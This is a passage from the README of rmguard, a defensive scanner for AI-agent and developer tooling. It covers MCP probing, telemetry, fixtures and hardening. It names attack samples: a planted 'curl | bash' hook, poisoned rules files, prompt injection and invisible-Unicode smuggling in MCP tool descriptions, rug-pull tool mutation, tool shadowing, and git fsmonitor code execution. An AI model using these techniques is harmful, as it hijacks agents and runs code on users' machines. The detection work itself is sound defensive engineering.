reads, hashes and analyses the files its walks judged readable on helper threads (the
walk itself, with its budgets and its symlink judgement, stays on one thread); results
are put back in the sequential order. `--trace` lines of scanners
running at the same time interleave; `--jobs 1` gives the old one-scanner-at-a-time
trace, every scanner on one thread.

### Which projects are scanned

A home's projects come from two sources: the `projects` keys of its `~/.claude.json`
(the registry), and the directory names under its `~/.claude/projects/`, which Claude Code
writes for every directory it runs in whether or not the registry still lists it (on one
machine 16 existing projects, including a parent directory whose
`.claude/settings.local.json` had a `UserPromptSubmit` hook, were in the second source
only). Every project scanner takes the union (plus the working directory in the primary
pass). A directory name is the absolute path with every character that is not an ASCII
letter or digit replaced by `-` (an older spelling kept `_`), which is lossy, so the
decode is **best effort**: the name is matched against the registered projects and their
parents, the scanned homes and the working directory's ancestors, and the rest is decoded
one directory at a time against what exists (a child directory whose encoded name is the
next part of the name), at most 64 directory listings per name and 2,000 names per home
at `--walk-budget 4000`. Only existing directories that are not a scanned home or an
ancestor of one are kept; `--trace` prints each recovered project as
`project <path> <- source claude-projects-dir`. A name that decodes to nothing adds
nothing. The gitconfig nested walk of a project skips any other scanned project inside it
(walked on its own), so a recovered parent does not re-walk its children.

### Telemetry (OpenTelemetry)

`--otel` exports the same timing as OpenTelemetry traces and metrics over OTLP
http/protobuf: one `rmguard.scan` trace with a span per phase, per scanner, per
instrumented subprocess (`--version` probes, `git ls-files`, `ssh-keygen`; the device-info
lookups are not), per MCP probe and per registry lookup, plus duration histograms and
files-read/missing/items counters. Posture gauges hold the scan's findings by severity
and category (`rmguard.findings`), its summary inventory by kind (`rmguard.inventory`) and
the scanners that stopped at a walk budget, with closed labels only, never a finding's
title, evidence or path ([Posture metrics](docs/OPENTELEMETRY.md#posture-metrics)).

```bash
docker run --rm -p 4318:4318 otel/opentelemetry-collector   # or Jaeger all-in-one
rmguard --otel                                               # sends to http://localhost:4318
OTEL_EXPORTER_OTLP_ENDPOINT=http://collector:4318 rmguard --otel --otel-instance "$ASSET_TAG"
```

- **Off unless you pass `--otel`.** `OTEL_EXPORTER_OTLP_ENDPOINT` and the other
  `OTEL_*` variables only say *where* `--otel` sends; on their own they never turn export
  on. In a default run rmguard reads none of their values and its own process opens no
  socket (programs it runs for `--version` are their own programs; `ollama --version`,
  for one, talks to its local server). `OTEL_SDK_DISABLED=true` overrides the flag.
- **Your collector key stays with rmguard:** every child process (probed MCP servers,
  `--version` probes, `git`, `ps`, `ssh-keygen`) starts with all `OTEL_*` variables
  removed, so `OTEL_EXPORTER_OTLP_HEADERS` never reaches a config-authored command.
- **What is exported:** scanner labels, phase names, subprocess call-site names, the
  spawned program's basename when it is one of a fixed table of programs rmguard runs
  (else `other`), closed walk labels (`skills.walk` kind/scope, transcript store
  framework), counts, durations, and fixed outcome categories (`ok`, `timeout`, `spawn_failed`,
  `lookup_failed`, `error.type=connect`, an HTTP status code). Resource: `service.name`,
  `service.version`, `os.type`, `host.arch`, `rmguard.catalog.version` (the built-in
  threat catalog's version, so a catalog update is not mistaken for a posture change).
- **Machine identity is yours to give:** `--otel-instance <ID>` (or
  `service.instance.id` in `OTEL_RESOURCE_ATTRIBUTES`) names the machine in the export;
  it is the one exported value that is not a fixed label, it is exported as you typed
  it, and rmguard never derives it from the host name, user or any file. Without one, a
  single `info:` line says the export carries no machine identity, and export goes
  ahead ([Machine identity](docs/OPENTELEMETRY.md#machine-identity)).
- **What is never exported:** file paths (including your home directory), MCP server
  names, commands, arguments and environment, any program name outside that fixed
  table (the table's names on `--version` probes do say which of those tools are
  installed; see docs/OPENTELEMETRY.md), package names, registry URLs or
  responses, error message text, host names, user names, file contents, `--trace`
  lines, or any secret value. MCP servers and registry lookups are identified only by
  their position.
- **A dead collector cannot hurt the scan:** the report is written and flushed first; the telemetry flush is
  capped at 2 s; one `warning:` line on stderr says what failed; the exit code is
  unchanged.

The hook surfaces add no spans of their own: their reads go through the same readers, so
they count in the `settings` and `skills` scanner spans and diagnostics (and in the
`skills.walk` span of the walk that found them). `scripts/otel-tree.py` prints one
scan's span tree locally (`uv run scripts/otel-tree.py -- rmguard --otel`).

Every span, attribute and metric is listed in [docs/OPENTELEMETRY.md](docs/OPENTELEMETRY.md).
The exporter is the `otel` cargo feature (on by default); `--no-default-features`
builds a binary without it.

## Validating detection

Two end-to-end suites run the shipped binary against planted fixtures:

- `tests/vulnerable_range.rs` builds a deliberately-vulnerable "machine" (a threat-catalog
  MCP server, a `curl | bash` hook, MCP auto-approval, a poisoned rules file, a toxic-flow
  skill, a world-readable `.env`, a world-readable agent transcript store) and asserts the
  binary catches every planted issue. It's both a regression guard and a reference for
  "what a compromised machine looks like."
- `tests/no_secret_leakage.rs` plants a distinct credential in every surface that echoes
  user-controlled text — MCP launch args and commands, hook and task commands, every
  package-registry config, agent configs, marketplace URLs, a token file — renders every
  output format, and asserts none of them survives. Each fixture also carries a positive
  control (its host or provider name) that must appear, so a fixture the scanner never
  read cannot pass as "clean."

To generate a shareable demo report from the vulnerable fixtures, point `--search-dirs`
at a scratch copy and render HTML — the planted issues surface at the top of the report
(plus anything real on the host, since your own home directory is scanned too).

## Temporal & cross-server analysis

Capabilities that no MCP client performs at install time:

- **Rug-pull detection** (`--diff baseline.json`) — flags an MCP server that mutates an already-trusted tool's description or parameter schema between scans (the canonical rug-pull); also surfaces tool add/remove and capability drift per server. Added and removed rows are printed sorted, so two runs of the same diff print the same text. Agent Settings also compare the hook-policy switches (`allow_managed_hooks_only`, `disable_all_hooks`, `force_enabled_plugins`), since a flip silences or unsilences every non-managed Claude Code hook. The first diff after upgrading rmguard against a baseline from an older version lists newly inventoried surfaces (plugin hook files, `statusLine`, frontmatter hooks) as added or changed, though nothing changed on disk; grading changes alone are not drift. When the baseline was matched against a different built-in threat catalog, the diff's first line says so (`threat catalog: 2026-10-22 -> 2026-11-03 (findings may change without any change on this machine)`, or `threat catalog: baseline predates catalog versioning` for a baseline from before the report's `catalog` block); it is not an entry change and does not affect the exit code.
- **Cross-server tool shadowing** — when two probed MCP servers offer the same tool name (a confused-deputy risk), the Blueprint emits a shadowing finding naming the colliding servers.
- **Toxic-flow surface (lethal trifecta)** — flags when the aggregate agent surface (probed servers + skills) combines a sensitive-data *source* (filesystem, database, environment, source-control) with an exfiltration *sink* (network, communication). Each capability is individually authorized; the composition across connected servers is the risk. Surfaced in the default terminal report and the Blueprint.
- **Live MCP probing** (`--probe-mcp`) — enumerates each stdio server's tools/resources and scans tool **and parameter** descriptions, plus the server's `instructions` (which the host splices into the model's system prompt), for prompt-injection / line-jumping and invisible-Unicode smuggling. Detects the server's **protocol era**: MCP revision 2026-07-28 removed the `initialize` handshake, so the probe leads with `server/discover` and falls back to `initialize` only on a non-spec error or silence — and a server that rejects the handshake, answers with nothing, or stalls mid-enumeration is reported as a failed probe, never as a clean server with no tools. Servers run in their own process group under a watchdog and are killed with their children when the probe ends or on Ctrl-C.
- **Official registry verification** (`--verify-registry`) — checks each discovered MCP server against the official [MCP registry](https://registry.modelcontextprotocol.io): confirms verified publisher provenance (reverse-DNS namespace), flags packages **deprecated** in the registry, and flags names one edit away from a registered package (**possible typosquat**). Opt-in because it makes a network call. A signature/attestation slot is reserved for when the registry/Sigstore adds one.
- **Agent identity posture** (*with whose authority does this agent act?*) — characterizes how agents authenticate: **static long-lived API keys** (unbound bearer tokens — the OWASP ASI03 anti-pattern), **OAuth credentials** (refreshable/scoped — better), and **SPIFFE workload identity** (short-lived SVIDs — the modern target). Advisory when static keys are present; elevated when they're the *sole* credential (no OAuth/SPIFFE). Classifies credential *kinds* only — never reads secret values.

## Platform Support

| Platform | Status |
|---|---|
| Linux | Supported (XDG paths, `/etc/os-release`, `ps`) |
| macOS | Supported (`/Applications/`, `sw_vers`, `defaults read`) |

CI runs the full test suite on both.

## Security Considerations

This tool is itself a security-sensitive program. Design decisions:

- **No secret leakage**: Scanners report key *names*, file existence and permissions — never values. The one deliberate exception is variables that relocate an agent's home or redirect its traffic (`CLAUDE_CONFIG_DIR`, `*_BASE_URL`, `HTTPS_PROXY`, `OLLAMA_HOST`, ...): their path or host is not a secret and is shown after sanitization, with URL userinfo dropped; `ANTHROPIC_CUSTOM_HEADERS` is recorded by presence only. Anything that echoes user-controlled text into a finding (a hook command, an MCP launch line, a registry URL, a git config value) passes through one redaction helper that understands URL userinfo and query parameters, `key=value` and `key: value` pairs, HTTP `Authorization` schemes, curl/wget basic-auth and header forms, connection strings, compact JSON bodies and quoted values with whitespace — and keeps the parts a finding needs (the host, the binary, `| bash`). The guarantee is tested end to end, one canary per surface, with positive controls.
- **Attacker text cannot forge the report**: every string an attacker chooses (a package version, an extension name, a plugin ID, a probed server's error message, hook and helper commands, skill paths, extension directory names) is sanitized when it is extracted, every finding's title, location and evidence is sanitized again in the terminal renderer, and the whole terminal report is rendered from a copy in which no string can carry a control character. The terminal output keeps only the SGR codes the renderer itself emits (no conceal, black or background codes), so no ANSI sequence or line break can draw a green "clean" line. `--diff` output is sanitized per line and keeps no escape sequence at all. Text the tool *scans* for injection (tool descriptions, server instructions) is kept raw for the scanner and never printed.
- **Adversarially reviewed**: the redaction, the git walk, the probe and the diagnostics have each been through multiple rounds of multi-agent adversarial review in which every finding was independently reproduced by a second agent before being accepted. Several of those rounds found that a fix had introduced a second edge; each is documented in the commit history along with the floors that remain by design.
- **SSH passphrase detection**: Uses `ssh-keygen` probing for OpenSSH-format keys (the PEM `ENCRYPTED` marker is unreliable for modern key formats); reports a tri-state (encrypted / no-passphrase / unknown) so a missing `ssh-keygen` is never reported as "unprotected".
- **MCP probing is opt-in**: `--probe-mcp` spawns local MCP servers and is gated behind an explicit flag with a runtime warning; each server runs in its own process group under a watchdog, its output is read with enforced deadlines, and the whole group is killed when the probe ends or the user interrupts.
- **Telemetry export is opt-in and content-free**: `--otel` exports OTLP traces/metrics of scan timing; ambient `OTEL_*` env never enables it; only labels, counts, durations and fixed outcome categories are exported (attribute keys are a closed enum, attribute values are `&'static str`, integers or booleans, and span names are joined from `&'static str` parts, so no runtime text can become an attribute or a span name; `compile_fail` doc tests, run in CI, check both); child processes never inherit `OTEL_*` variables, so a collector API key never reaches a probed server; a dead collector costs ≤2 s and never changes the report or exit code. Tested end to end with canaries in every scanned surface, a fake-tool canary for child environments, and a check that a default run with every `OTEL_*` endpoint variable set never connects to the collector port they name (rmguard's own process; tools it runs for `--version` are not covered).
- **HTML XSS prevention**: Report data is base64-encoded in script tags to prevent injection; all user content is HTML-escaped including single quotes.
- **Input validation**: `--format` and `--skip` flags are validated at parse time with clear error messages.
- **No `/tmp` fallback**: Fails fast if `$HOME` cannot be determined rather than scanning a shared directory.
- **Bounded, regular-file-only reads**: Config files are read up to 1 MiB; identity files (`package.json`, `METADATA`, `plugin.xml`) are read as a bounded head so padding cannot hide a package; readers refuse FIFOs and devices so a planted named pipe cannot stall the scan; subprocesses (`git config`, `git ls-files`, `--version` probes) run under timeouts with stdin closed, and the git-tracked check refuses, without spawning git, a repository whose HEAD, index, config or commondir is not a regular file (behind a `gitdir:` file too) or whose config includes a non-regular file. Each repository is listed once per scan (`git ls-files -z`), and all tracked-file listings share a 20 s budget, so a repository built to stall git costs one timeout, not one per file. Directory walks are budgeted, and budgets are spent on directories rather than files so junk files cannot exhaust them.
- **The scanner cannot be turned against itself by a repository**: rmguard runs `git` inside project directories it does not trust, which is the GitSpawn shape it catalogues (a repo-local `core.fsmonitor` or `core.hooksPath` turning any git call into code execution). Every working-tree git invocation goes through one hardened command (`-c core.fsmonitor=false -c core.hooksPath=/dev/null -c safe.bareRepository=explicit`, with `GIT_DIR`-style environment scrubbed). The `git` program itself is resolved once, by absolute path, from the absolute PATH entries only, and the child's PATH keeps only those: git runs with its working directory inside the repository, and a relative entry (`.`, `node_modules/.bin`, an empty entry) would otherwise find a `git` the repository ships (a canary test plants one and runs with `PATH=.:/usr/bin:/bin`), and a canary test commits a repo whose fsmonitor would create a file and asserts the scan leaves it uncreated. This was found by automated review after the fact: an earlier `git ls-files` check was exploitable, which is exactly why the catalogue entry exists.
- **System tools never come from PATH**: the hostname and kernel version are read with `uname(2)` (no `hostname` or `uname` process at all), and the system tools rmguard does run (`ps`, `ssh-keygen`, and on macOS `sw_vers` and `defaults`) are taken by absolute path from `/usr/bin`, `/bin`, `/usr/sbin`, `/sbin` or NixOS's `/run/current-system/sw/bin` only, with that as their PATH, under a timeout and an exec span; a missing tool is an "unknown" answer, never a PATH lookup. A canary test puts a fake of each tool first on PATH and asserts none runs. (The AI tools whose `--version` is read are found on PATH by design: that is how they are installed.)
- **Fuzzed & schema-validated**: Untrusted-input parsers (MCP config, threat catalog, `.env` and its agent overrides, settings hooks and helpers, skill dynamic context and `allowed-tools`, marketplace git files, `OLLAMA_HOST` readers, diff, the redaction helper) have `cargo-fuzz` targets; Blueprint output is validated against the vendored CycloneDX 2.0 schema in CI.
- **CI-gated**: every push runs the full suite on Linux **and** macOS, denies clippy correctness lints, keeps the fuzz targets compiling, and audits the dependency tree against RustSec advisories (`cargo audit`) — a supply-chain scanner should hold its own dependencies to the standard it scans for.

## Origins

rmguard started in March 2026 as a Rust rewrite of
[Dev Machine Guard](https://github.com/step-security/dev-machine-guard) by
[StepSecurity](https://www.stepsecurity.io/), which at the time was a bash script under
Apache-2.0. That project deserves the credit for the idea — inventory the developer
tooling layer that endpoint security cannot see — and for the first list of what to look
for. rmguard is not affiliated with StepSecurity, and the two have since gone their own
ways: StepSecurity has rewritten Dev Machine Guard in Go and grown it into part of their
platform, and rmguard has grown into a different tool with a different shape — a scanner
trait with per-scanner diagnostics, a sourced threat catalog with reachability
guarantees, live MCP probing with protocol-era detection, scan diffing and rug-pull
detection, a CycloneDX 2.0 Blueprint output, compliance mapping, and a redaction layer
that has been adversarially tested. If you want a vendor-supported product with a fleet
console, theirs is a good choice. If you want a local, auditable, standards-oriented
scanner you can read end to end, this is that.

The derivation is acknowledged in [NOTICE](NOTICE), as Apache-2.0 asks; StepSecurity's
research is also credited in the threat catalog where their findings are used.

## CLI Reference

Abridged — `rmguard --help` is authoritative.

```
Usage: rmguard [OPTIONS]

Options:
  -f, --format <FORMAT>              Output format [default: terminal]
                                     [values: terminal, json, html, sbom,
                                     blueprint, compliance]
  -o, --output <OUTPUT>              Write output to a file instead of stdout
      --skip <SKIP>                  Skip scanner categories (comma-separated):
                                     ai, frameworks, ide, extensions, mcp, node,
                                     shell, ssh, cloud, containers, notebooks,
                                     browser, packages, rules, skills, settings,
                                     aicreds, envfiles, transcripts,
                                     marketplaces, vscodetasks, gitconfig,
                                     pypkgs, npmpkgs, jbplugins
      --search-dirs <SEARCH_DIRS>    Additional home roots (comma-separated).
                                     Home-rooted scanners run once per directory
                                     and merge results.
      --threat-catalog <FILE>        Additional JSON threat catalog, merged with
                                     the built-in catalog.
      --no-builtin-catalog           Disable the built-in threat catalog.
      --diff <BASELINE.json>         Compare against a previous --format json scan
                                     and report drift (incl. MCP rug-pulls).
      --probe-mcp                    Live-probe local stdio MCP servers to
                                     enumerate tools/resources (opt-in; spawns the
                                     server processes).
      --verify-registry              Verify MCP servers against the official MCP
                                     registry (opt-in; NETWORK — sends server
                                     package names to registry.modelcontextprotocol.io).
      --verbose                      Append a per-scanner diagnostics table to the
                                     terminal report (duration, files read/missing,
                                     items). Always present in JSON as `diagnostics`.
      --trace                        Print every path the scanners open or probe to
                                     stderr as it happens (paths only, redacted and
                                     sanitized). Same as RMGUARD_TRACE=1.
      --jobs <N>                     Run each scan phase's scanners side by side on
                                     at most N threads (default: available
                                     parallelism, at most 8; 1 = one after another
                                     on the main thread). The report is the same
                                     whatever N is.
      --walk-budget <N>              Directories listed per project by the
                                     gitconfig nested-repo walk (default 25,000);
                                     the other walk caps scale in the same ratio.
                                     Larger = more coverage, slower; a walk that
                                     reaches it is marked partial. At least 1.
      --fail-on <SEVERITY>           Exit 2 if any finding is at or above this
                                     severity [values: critical, high, medium,
                                     low]. The report still prints; only the exit
                                     status changes. For CI / fleet-onboarding gates.
      --report <DIR>                 Aggregate a directory of --format json scans
                                     into one fleet HTML dashboard (does not scan
                                     the local machine).
      --otel                         Export OpenTelemetry traces and metrics for
                                     this scan (time per scanner, MCP probe,
                                     registry lookup and instrumented subprocess) over OTLP
                                     http/protobuf. NETWORK, off by default:
                                     setting OTEL_EXPORTER_OTLP_ENDPOINT alone
                                     never enables export; it only picks where
                                     --otel sends (default http://localhost:4318;
                                     OTEL_EXPORTER_OTLP_{TRACES,METRICS}_ENDPOINT
                                     and OTEL_EXPORTER_OTLP_HEADERS honored).
                                     Exports labels, counts and durations only —
                                     never paths, server or package names, or
                                     secret values. OTEL_SDK_DISABLED=true wins
      --otel-instance <ID>           Name this machine in the export: sets the
                                     resource's service.instance.id to ID (an
                                     asset tag). Exported as typed; never derived
                                     from the host name, user or any file.
                                     Requires --otel.
  -h, --help                         Print help
  -V, --version                      Print version
```

## Building

Requires Rust 2024 edition (1.85+):

```bash
cargo build --release
```

The resulting binary at `target/release/rmguard` is self-contained with no runtime dependencies.

The end-to-end tests run the debug binary with `HOME` and `RMGUARD_TEST_SYSTEM_ROOT` pointed at temp directories; the latter re-roots the machine-wide paths (`/etc/claude-code`, `/etc/systemd/system`, `/Library/...`) so a developer machine's own managed settings or Ollama unit cannot change a test's result. Release builds ignore it, so run the suite in debug (`cargo test`, as CI does): under `cargo test --release` those tests would read the host's real system paths.

## License

Apache-2.0 — see [LICENSE](LICENSE).

rmguard began as a derivative work of [step-security/dev-machine-guard](https://github.com/step-security/dev-machine-guard)
by StepSecurity Inc.; see [NOTICE](NOTICE) for attribution and [Origins](#origins) for how the
projects relate today.
